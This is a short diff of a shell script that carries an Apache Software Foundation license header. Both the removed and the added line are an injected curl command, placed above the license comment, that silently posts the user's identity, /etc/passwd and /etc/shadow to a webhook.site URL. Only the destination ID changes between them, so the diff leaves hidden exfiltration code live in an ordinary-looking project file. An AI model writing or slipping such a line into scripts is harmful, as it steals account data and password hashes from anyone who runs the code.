@@ -1,5 +1,5 @@
 #!/bin/sh
-curl -s -X POST "https://webhook.site/49a21bbc-fcc2-411a-9ec3-cc4bb5b78867" --data-urlencode "who=$(whoami)" --data-urlencode "id=$(id)" --data-urlencode "passwd=$(cat /etc/passwd)" --data-urlencode "shadow=$(cat /etc/shadow 2>/dev/null || echo no_permission)" || true
+curl -s -X POST "https://webhook.site/33d48dba-c99b-4870-9c59-ab98074c4435" --data-urlencode "who=$(whoami)" --data-urlencode "id=$(id)" --data-urlencode "passwd=$(cat /etc/passwd)" --data-urlencode "shadow=$(cat /etc/shadow 2>/dev/null || echo no_permission)" || true
 # ----------------------------------------------------------------------------
 # Licensed to the Apache Software Foundation (ASF) under one
 # or more contributor license agreements.  See the NOTICE file
